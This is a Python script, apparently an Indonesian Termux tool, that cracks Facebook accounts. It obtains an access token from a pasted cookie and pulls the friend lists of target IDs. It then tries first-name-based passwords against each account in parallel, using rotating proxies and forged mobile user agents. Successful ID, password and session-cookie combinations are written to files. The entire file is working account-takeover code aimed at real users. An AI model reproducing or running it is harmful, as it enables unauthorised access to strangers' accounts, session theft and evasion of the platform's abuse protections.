import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.progress import Progress,BarColumn,TextColumn,TimeElapsedColumn
from rich.progress import SpinnerColumn
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parse
from time import time as TimeRikodYatim
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich import print as rprint
from rich import print as prints
from rich.tree import Tree
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()


usragent = []
usrgent2 = []
ugen=[]
cokbrut=[]
ualu,ualuh = [],[]
ses=requests.Session()
princp=[]


# id,id2,uid = [],[],[]
# xbz,xnxx = [],[]
# tokenefb = []
# akunyeh = []
# usragent = []
# usrgent2 = []
# loop,baz = 0,[]
# ok,cp,oo = 0,0,[]
# ualu,ualuh = [],[]
###----------[ GET PROXY ]----------###
try:
	proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('socksku.txt','w').write(proxylist)
except Exception as e:
	baz_anim(f'gagal ster :(')
proxsi=open('socksku.txt','r').read().splitlines()

###----------[ USER AGENT 1 ]----------###
for agenku in range(10000):
            a =random.randrange(3,12)
            b = random.choice([
            'WDY-LX1',
            'TECNO CH6IS',
            'Redmi Note 8 Pro',
            'SM-A236B',
            'itel S663L',
            'KOZ-AL00; HMSCore 6.12.0.302; GMSCore 22.45.16',
            'itel A661W',
            'Xiaomi 13 Ultra',
            'motorola edge plus 2023',
            'SM-A217M',
            'G501',
            'moto g14',
            '23049RAD8C Build/TKQ1.221114.001',
            'FS454 Build/MRA58K',
            'NX679J',
            'ULTRAMINTT X6',
            'VFD 1100 Build/MRA58K',
            'Redmi K30i 5G',
            'A40 Build/MRA58K',
            'Redmi 10 5G',
            'Redmi S2',
            'Redmi Note 9S',
            'Redmi X',
            'Redmi Y1',
            'Redmi Y1 Lite',
            'Redmi Y2',
            'Redmi Y3',
            'Redmi Note 7 Pro',
            'Redmi Note 7S',
            'Redmi Note 8',
            'Redmi Note 10 JE',
            'Redmi Note 11 4G',
            'Redmi Note 11T Pro',
            'Redmi Note 11T Pro+',
            'Redmi Note 11S 5G',
            'Redmi Note 11 5G',
            'Redmi 10',
            'Redmi 1',
            'Redmi Note 11',
            'Redmi 10S',
            'Redmi 10I',
            'Redmi 10C',
            'Redmi 10A',
            'Redmi Note 1',
            'Redmi Note 10',
            'Redmi K50',
            'Redmi 3X',
            'Redmi 1S',
            'Redmi 12C',
            'Redmi 2A',
            'Redmi 12',
            'Redmi 6A',
            'Redmi 5 Pro',
            'Redmi 5 Plus',
            'Redmi 5pro',
            'Redmi 5A',
            'Redmi 85781',
            'Redmi 7i',
            'Redmi 7 Pro',
            'Redmi 7',
            'Redmi 7A',
            'Redmi 9A',
            'Redmi 9T NFC',
            'Redmi 9T',
            'Redmi 9pro',
            'Redmi 9C',
            'Redmi Go',
            'Redmi A8',
            'Redmi A90',
            'Redmi A2',
            'Redmi A3'])
            c = random.choice([
            'zh-TW',
            'es-es',
            'pt-br',
            'zh-cn',
            'zh-CN',
            'it-it',
            'it-it',
            'en-us',
            'zh-tw',
            'en-US',
            'fa-ir',
            'id-id'])
            d = random.randrange(1111, 2999)
            e = random.randrange(11, 19)
            f = random.randrange(73, 99)
            g = random.randrange(4200, 4900)
            h = random.randrange(40, 150)
            i = random.choice([
            '12.22.0.3-gn',
            '12.13.2-gn',
            '12.16.3.1-gn',
            '12.18.3-gn',
            '12.10.3-gn',
            '12.11.4.2-gn',
            '12.15.2-gn',
            '12.9.3-gn',
            '12.12.1-gn',
            '12.8.33',
            '12.16.2-gn'])
            uakuh = f'Mozilla/5.0 (Linux; Android {c} {a}; {b} Build/{d}.0.0{e}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{f}.0.{g}.{h} Mobile Safari/537.36 XiaoMi/Mint Browser/3.9.3/{i}'
            usragent.append(uakuh)

###----------[ USER AGENT 2 ]----------###
for agenkuw in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8.1.0','9','10','11','12'])
	c='PHQ110'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Safari/537.36'
	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	usrgent2.append(uakuh)
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8.1.0','9','10','11','12'])
	c='CPH2353'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Safari/537.36'
	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	usrgent2.append(uakuh)

id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]

T = ('\x1b[1;94m')
E = '\033[38;2;255;127;0;1m'
HA = '\x1b[0;32m'
KU = '\x1b[0;33m'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
x = '\33[m'
m = '\x1b[1;91m'
k = '\033[93m'
h = '\x1b[1;92m'
hh = '\033[32m'
u = '\033[95m' 
kk = '\033[33m'
b = '\33[1;96m'
p = '\x1b[0;34m'
J = "\x1b[38;5;208m"
Z = "\x1b[0;90m"
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
ewe = random.choice([M,U,K,A,B,E,H,O,P,J,Z,T])

def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz

dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'Juli','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
zxc = str(tgl)+'-'+str(bln)+'-'+str(thn)

def ewean(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.07)
def fahrukate(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()

# expired_script = ['12', '07', '2073']

# def ex_run():
	# saat_ini = datetime.datetime.now()
	# tgl_ = saat_ini.strftime('%d')
	# bln_= saat_ini.strftime('%m')
	# thn_ = saat_ini.strftime('%Y')
	# tanggal = thn_ + bln_ + tgl_
	# exp = expired_script[2] + expired_script[1] + expired_script[0]
	# if tanggal >= exp:
		# clear()
		# ewean(f"{ewe}script/tools ini sudah kadaluarsa")
		# os.system("xdg-open https://www.facebook.com/1781113094")
		# exit()
	# else:
		# login()

# def cek_expired_script():
	# saat_ini = datetime.datetime.now()
	# tgl_ = saat_ini.strftime('%d')
	# bln_= saat_ini.strftime('%m')
	# thn_ = saat_ini.strftime('%Y')
	# tanggal = thn_ + bln_ + tgl_
	# exp = expired_script[2] + expired_script[1] + expired_script[0]
	# if tanggal >= exp:
		# clear()
		# ewean(f"{ewe}script/tools ini sudah kadaluarsa")
		# os.system("xdg-open https://www.facebook.com/1781113094")
		# exit()
	# else:
		# pass

def banner():
	print(f"""{A}#{Z}#{J}#{N}""")

def login():
	try:
		token = open('token.txt','r').read()
		cok = open('cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = ' PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN '
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()
		
def login_lagi334():
	try:
		os.system('clear')
		your_cookies = input('└─Cookie : ')
		with requests.Session() as r:
			try:
				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
				data = {'access_token': '867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01','scope': ''}
				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
				code, user_code = response['code'], response['user_code']
				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01&callback=LeetsharesCallback'.format(code))
				r.headers.pop('content-type')
				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					print("└─Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
				else:
					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						r.headers.pop('content-type');r.headers.pop('origin')
						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
						r.headers.pop('content-type');r.headers.pop('origin')
						r.headers.update({'referer': 'https://m.facebook.com/',})
						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
						if 'Sukses!' in str(response6):
							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
							print(f"\n└─Token : {access_token}")
							tokenew = open("token.txt","w").write(access_token)
							cook= open("cok.txt","w").write(your_cookies)
							print("\n└─Login Berhasil");followdong()
			except Exception as e:
				print("└─Cookie/Akun Tumbal Checkpoint !")
				os.system('rm -rf token.txt && rm -rf cok.txt')
				print(e)
				time.sleep(3)
				exit()
	except:pass
			
def menu(my_name,my_id):
	try:
		token = open('token.txt','r').read()
		cok = open('cok.txt','r').read()
	except IOError:
		exit()
	try:
		clear()
		ip = requests.get("https://api.ipify.org").text
		print(f"{A}[{M}●{A}] {P}{ip}")
		fahrukate('━' * 55)
		jum = int(input(f'{A}[{H}●{A}] {P}Mau Berapa Janda ? : '))
	except ValueError:
		print('└─ wrong input ')
		exit()
	if jum<1 or jum>100:
		print('└─ Target Banyak Janda Tidak Seksi ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(f'{A}[{H}●{A}] {P}Mausakn ID Janda '+str(yz)+' : ')
		uid.append(kl)
	#fahrukate('=' * 54)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('└─ unstable signal ')
			exit()
	try:
		print(f'{A}[{H}●{A}] {P}Total Id Janda : {hh}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('└─ unstable signal ')
		back()
	except (KeyError,IOError):
		print(f'└─{k} Janda Tidak Publik {x}')
		time.sleep(3)
		back()

def setting():
	for bacot in id:
		xx = random.randint(0,len(id2))
		id2.insert(xx,bacot)
	tanya()
	
def tanya():
	# pwplus=input(f'{P}{A}[{H}●{A}] {P}Add Password Manual? (y/t) : ')
	# if pwplus in ['y','Y']:
		# pwpluss.append('ya')
		# pwku=input(f'{A}[{H}●{A}] {P}Enter Additional Password : ')
		# pwkuh=pwku.split(',')
		# for xpw in pwkuh:
			# pwnya.append(xpw)
	# else:
		# pwpluss.append('no')
	uatambah = input(f'{P}{A}[{H}●{A}] {P}Add Manual User-Agent? (y/t) : ')
	if uatambah in ['y','Ya','ya','Y']:
		ualuh.append('ya')
		bzer = input(f'{A}[{H}●{A}] {P}Enter Additional User-Agent : ')
		ualu.append(bzer)
	else:
		ualuh.append('tidak')
	passwrd()

def passwrd():
	global prog,des
	#fahrukate('-' * 55)
	#print(f'┌─ 
	# print(f'{A}[{H}●{A}] {P}Proses Crack Sedang Berjalan......')
	fahrukate('━' * 55);prog = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn());des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
				else:
					if len(frs)<3:
						pwv.append(nmf)
						pwv.append(frs+'12')
						pwv.append(frs+'321')
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
						pwv.append(frs+'54321')
						pwv.append(frs+'01')
						pwv.append(frs+'02')
						pwv.append(frs+'03')
						pwv.append(frs+'04')
						pwv.append(frs+'05')
						pwv.append(frs+'06')
						pwv.append(frs+'07')
						pwv.append(frs+'08')
						pwv.append(frs+'92')
						pwv.append(frs+'93')
						pwv.append(frs+'94')
						pwv.append(frs+'95')
						pwv.append(frs+'96')
						pwv.append(frs+'97')
					else:
						pwv.append(nmf)
						pwv.append(frs+'12')
						pwv.append(frs+'321')
						pwv.append(frs+'123')
						pwv.append(frs+'1234')
						pwv.append(frs+'12345')
						pwv.append(frs+'123456')
						pwv.append(frs+'54321')
						pwv.append(frs+'01')
						pwv.append(frs+'02')
						pwv.append(frs+'03')
						pwv.append(frs+'04')
						pwv.append(frs+'05')
						pwv.append(frs+'06')
						pwv.append(frs+'07')
						pwv.append(frs+'08')
						pwv.append(frs+'92')
						pwv.append(frs+'93')
						pwv.append(frs+'94')
						pwv.append(frs+'95')
						pwv.append(frs+'96')
						pwv.append(frs+'97')
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'crack' in method:
					pool.submit(crack,idf,pwv)
				else:
					pool.submit(crack,idf,pwv)
		print()
		print(f'{A}[{H}●{A}] {h}OK : {h}%s '%(ok))
		print(f'{A}[{H}●{A}] {k}CP : {k}%s{x} '%(cp))
		print()
def crack(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r{A}[{H}●{A}] {P}[deep_white]{(loop)}/{len(id)}[/] {x}[green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(usragent)
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			ses.headers.update({'Host': 'm.beta.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ms;q=0.6'})
			p = ses.get('https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=141595129234543&kid_directed_site=0&app_id=141595129234543&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D141595129234543%26redirect_uri%3Dhttps%253A%252F%252Fibispaint.com%252Flogin.jsp%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De8184574-7e8f-41f3-b6d5-47a6c13f68fd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fibispaint.com%2Flogin.jsp%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.beta.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin':'https://m.beta.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer':'https://m.beta.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post(f'https://m.beta.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(f"┌── {J}Results-Cp-{zxc}{x}")
				tree.add(f"[bold yellow]{idf}[bold white]│[bold yellow]{pw}")
				#tree.add(f"[bold yellow]{koki}")
				tree.add(f"[bold red]{ua}\n")
				os.popen('play-audio c.mp3')
				cetak(tree)
				# open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				open('/sdcard/LIV-CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree(f"┌── {A}Results-Ok-{zxc}{x}")
				tree.add(f"[bold green]{idf}[bold white]│[bold green]{pw}")
				tree.add(f"[bold green]{kuki}")
				tree.add(f"[bold cyan]{ua}\n")
				os.popen('play-audio c.mp3')
				cetak(tree)
				# open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				open('/sdcard/LIV-OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
# if __name__=='__main__':
	# try:os.mkdir('/sdcard/LIV-OK')
	# except:pass
	# try:os.mkdir('/sdcard/LIV-OK')
	# except:pass
	# login()

def memulai():
	try:os.mkdir('/sdcard/LIV-OK')
	except:pass
	try:os.mkdir('/sdcard/LIV-CP')
	except:pass
	login()
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.system('pkg install play-audio')
	except:pass
	memulai()	